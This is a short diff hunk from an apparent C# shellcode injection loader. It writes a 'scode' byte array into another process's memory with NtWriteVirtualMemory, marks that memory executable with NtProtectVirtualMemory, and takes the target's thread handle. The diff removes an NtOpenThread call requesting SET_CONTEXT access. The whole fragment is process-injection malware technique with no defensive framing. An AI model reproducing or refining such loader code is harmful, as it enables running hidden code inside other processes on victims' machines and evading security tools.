@@ -39,11 +39,6 @@ public class Code
           Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);
           NtWriteVirtualMemory(pi.hProcess, ref VirtualAllocExResult, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
           Marshal.FreeHGlobal(unmanagedPointer);
-          CLIENT_ID clientid = new CLIENT_ID();
-          clientid.UniqueProcess = new IntPtr(pi.dwThreadId);
-          clientid.UniqueThread = IntPtr.Zero;
-          IntPtr OpenThreadResult = IntPtr.Zero;
-          NtOpenThread( out OpenThreadResult, ThreadAccess.SET_CONTEXT, new OBJECT_ATTRIBUTES(), ref clientid);
           MemoryProtection OldProtect;
           NtProtectVirtualMemory( pi.hProcess, ref VirtualAllocExResult, ref scodeSize, MemoryProtection.ExecuteRead, out OldProtect );
           IntPtr ptrToHandle = (IntPtr)pi.hThread;
